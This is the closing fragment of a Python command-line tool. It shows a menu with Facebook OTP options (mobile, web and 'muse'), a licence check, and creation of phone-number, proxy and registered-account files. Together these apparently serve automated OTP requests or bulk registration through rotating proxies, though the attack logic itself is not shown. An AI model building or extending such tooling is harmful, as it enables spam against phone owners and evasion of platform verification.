        choice = input(f'{GREEN} [{RED}◆{GREEN}] Select Option {EKL} ').strip()
        if choice in ('1', '01'):
            run()
        elif choice in ('2', '02'):
            mfacebook_otp_menu()
        elif choice in ('3', '03'):
            web_facebook_otp_menu()
        elif choice in ('4', '04'):
            pass
            #change_proxy_country_tool()
        elif choice in ('5', '05'):
            muse_otp_menu()
        elif choice in ('6', '06'):
            print(f'\n{GREEN} [{RED}◆{GREEN}] Exiting...')
            time.sleep(1)
            sys.exit(0)
        else:
            print(f'\n{RED} Invalid Option! Please try again.')
            time.sleep(1.5)


if __name__ == '__main__':
    try:
        clear_logo()
        verify_auth()
        if not os.path.exists(get_number_file_path()):
            with open('Number_List.txt', 'w') as f:
                pass
        if not os.path.exists(get_proxy_file_path()):
            with open('Proxy_List.txt', 'w') as f:
                pass
        reg_file = get_registered_file_path()
        if not os.path.exists(reg_file):
            with open(reg_file, 'w', encoding='utf-8') as f:
                pass
        main_menu()
    except Exception as e:
        import traceback
        print(f'\nCRITICAL ERROR: {e}')
        traceback.print_exc()
        input('\nPress Enter to exit...')
